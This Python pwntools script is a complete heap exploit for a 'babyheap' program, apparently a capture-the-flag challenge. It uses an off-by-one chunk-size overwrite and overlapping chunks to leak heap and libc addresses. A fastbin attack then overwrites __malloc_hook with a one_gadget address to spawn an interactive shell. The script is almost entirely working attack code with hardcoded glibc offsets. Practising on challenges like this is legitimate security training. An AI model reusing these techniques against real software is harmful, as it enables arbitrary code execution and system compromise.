from pwn import *
context(log_level='debug')
DEBUG=1
if DEBUG:
	p=process('./babyheap')#,env={"LD_PRELOAD":"./libc-2.24.so"},aslr=False)
	# gdb.attach(p)
	# p.interactive()
else:
	p=remote()

def alloc(size):
	p.recvuntil('Command:')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
def update(index,size,content):
	p.recvuntil('Command:')
	p.sendline('2')
	p.recvuntil('Index:')
	p.sendline(str(index))
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.send(content)
def delete(index):
	p.recvuntil('Command:')
	p.sendline('3')
	p.recvuntil('Index:')
	p.sendline(str(index))
def view(index):
	p.recvuntil('Command:')
	p.sendline('4')
	p.recvuntil('Index')
	p.sendline(str(index))
	p.recvuntil(']: ')
	return p.recvline()
def main():
	alloc(0x18)#0x00
	alloc(0x18)#0x20
	alloc(0x18)#0x40
	alloc(0x18)#0x60
	alloc(0x48)#0x80
	alloc(0x58)#0xd0
	alloc(0x58)#0x130
	
	update(0,0x19,'0'*0x18+'\x61')

	delete(1)
	alloc(0x58)#0x20

	update(1,0x58,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*3)
	delete(3)
	delete(2)
	
	heapbase=u64(view(1)[0x20:0x28])-0x60
	alloc(0x18)#0x40
	
	update(1,0x20,p64(0)*3+p64(0x91))
	delete(6)
	delete(2)
	libcbase=u64(view(1)[0x20:0x28])-0x3c4b78
	
	alloc(0x48)#0x40
	delete(2)

	# alloc(0x18)
	if DEBUG:
		main_arena=0x3C4B20
		free_hook=0x3C67A8
		malloc_hook=0x3C4B10
	else:
		main_arena=0x399B00
		free_hook=0x39B788
		malloc_hook=0x399AF0

	
	

	
	update(1,0x30,p64(0)*3+p64(0x51)+p64(libcbase+main_arena+0x25)*2)
	
	
	alloc(0x48)
	alloc(0x48)
	log.success('libcbase: 0x%x heapbase: 0x%x'%(libcbase,heapbase))
	
	update(3,0x80-0x55,'\x00'*(0x78-0x55)+p64(libcbase+malloc_hook-0x18))
	alloc(0x48)
	one_gadget=0x45216
	one_gadget=0x4526a
	update(6,0x10,p64(0)+p64(one_gadget+libcbase))
	# gdb.attach(p,'vm\n')
	alloc(0x40)
	# update()
	
	'''
	update(3,0x80-0x55,'\x00'*(0x78-0x55)+p64(libcbase+free_hook-0xb58))	
	update(1,0x50,p64(0)*3+p64(0x31)+p64(0)*5+p64(0xbeef))

	for j in range(10):
		for i in range(10-j):
			print i,'---------------------------'
			alloc(0x48)
		for i in range(14-j,5,-1):
			print '-----------------------',i
			delete(i)
		
		delete(2)
		update(1,0x20,p64(0)*3+p64(0x51))
		alloc(0x48)
		print '-----------------',j
	

	
	view(1)
'''
	p.interactive()

if __name__=='__main__':
	main()
	pass
